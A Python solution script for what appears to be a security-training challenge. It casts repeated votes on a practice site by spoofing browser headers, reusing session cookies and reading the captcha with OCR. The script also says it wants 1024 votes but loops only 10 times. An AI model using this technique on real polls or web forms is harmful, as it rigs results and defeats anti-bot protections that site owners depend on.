#!/usr/bin/python3
""" Write a script or a program that votes 1024 times for your id here: http://158.69.76.135/level3.php """
""" We only take votes from Windows users. """
import requests
try:
    import Image
except ImportError:
    from PIL import Image
import pytesseract

url = "http://158.69.76.135/level3.php"
captcha = "http://158.69.76.135/captcha.php"
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0', 'Referer': 'http://158.69.76.135/level2.php'}

with requests.session() as client:
    for i in range(10):
        key = client.get(url)
        img_captcha = client.get(captcha, cookies=key.cookies)
        key_dic = key.cookies.get_dict()
        cookies = key.cookies['HoldTheDoor']
        phpsessid = key.cookies['PHPSESSID']
        with open("captcha_img.png", 'wb') as f:
            for j in img_captcha.iter_content():
                f.write(j)
        open_img = Image.open("captcha_img.png")
        open_img.load()
        convert_text = pytesseract.image_to_string(open_img)
        data_post = {"id": 19920001, "holdthedoor": "Submit", "key": key_dic['HoldTheDoor'], "captcha": convert_text}
        client.post(url, data=data_post, cookies={'HoldTheDoor': cookies, 'PHPSESSID': phpsessid}, headers=headers)
